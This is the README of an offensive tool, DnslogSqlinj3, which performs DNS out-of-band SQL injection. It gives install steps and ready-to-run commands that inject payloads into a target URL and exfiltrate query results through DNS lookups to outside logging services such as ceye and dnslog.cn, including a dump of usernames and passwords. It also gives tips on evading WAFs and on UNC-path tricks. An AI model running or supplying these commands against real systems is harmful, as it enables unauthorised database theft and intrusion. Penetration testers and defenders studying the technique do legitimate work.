# DnslogSqlinj3

Modern DNS out-of-band SQL injection tool. Python 3.8+, single file, no dependencies.
Unofficial rewrite of [DnslogSqlinj](https://github.com/ADOOO/DnslogSqlinj) (2019, Python 2, ceye-only, MySQL-only).

## Install

```bash
git clone https://github.com/Pluck9527/DnslogSqlinj3 && cd DnslogSqlinj3
python3 dnslogsqlinj3.py --help      # run directly
pip install .                        # or install the `dnslogsqlinj3` command
```

## Usage

```bash
# 1. connectivity check — only "[+] platform received" means OK
python3 dnslogsqlinj3.py --token TOKEN --ident IDENT --check

# 2. confirm the injection point
python3 dnslogsqlinj3.py --token TOKEN --ident IDENT --dbms mysql \
  --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" --expr "select 0x414243"

# 3. dump
python3 dnslogsqlinj3.py --token TOKEN --ident IDENT --dbms mysql \
  --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" \
  --expr "select group_concat(username,0x3a,password) from users"
```

Default provider is ceye (`--token` + `--ident`). Other options: `dnslog.cn`, `dnsloggo` (`--base` + `--token`), `cmd`.

## Techniques

| Technique | Flag | Payload per query | Requires |
|---|---|---|---|
| DNS hex (default) | — | 30 bytes | FILE privilege + outbound DNS |
| DNS boolean | `--blind` | 7 requests/char | FILE privilege + outbound DNS |
| SQLite... no | | | |
| SLEEP blind | `--technique time` | 7 × samples req/char | nothing but working SQL |

## Flags

| Flag | Default | Notes |
|---|---|---|
| `--dbms` | mysql | mysql / mssql / oracle / postgres |
| `--http-timeout` | 3 | UNC hangs on SMB; DNS is already sent — abort early |
| `--chunk` | 30 | hex = 60 chars, DNS label limit is 63; 60+ fails |
| `--poll` | 1 | platform polling interval (s) |
| `--threads` | 1 | parallel chunks; raise only if the target handles concurrency |
| `--prefix` | `AND ` | payload prefix; use `;` for stacked MSSQL |
| `--encode` | auto | keeps `()'"` raw to slip past WAFs; `strict` = full urlencode |
| `--check` / `--self-test` | — | connectivity probe / offline self-test |

## Gotchas

- Full URL-encoding turns `/ " ( )` into `%2F %22 %28` and some WAFs drop the connection. Default keeps them raw.
- MySQL on Windows only resolves `//host/share/x.txt`; backslash UNC silently returns NULL.
- `%PAYLOAD%` replaces the expression only — the script adds `AND `, so `id=1'%PAYLOAD%--+-` is valid.
- ceye caches filtered record queries; the tool fetches recent records and matches locally.

## Test

```bash
python3 -m unittest discover -s tests -t .    # 24 offline tests
```

## License

MIT. For authorized testing only.
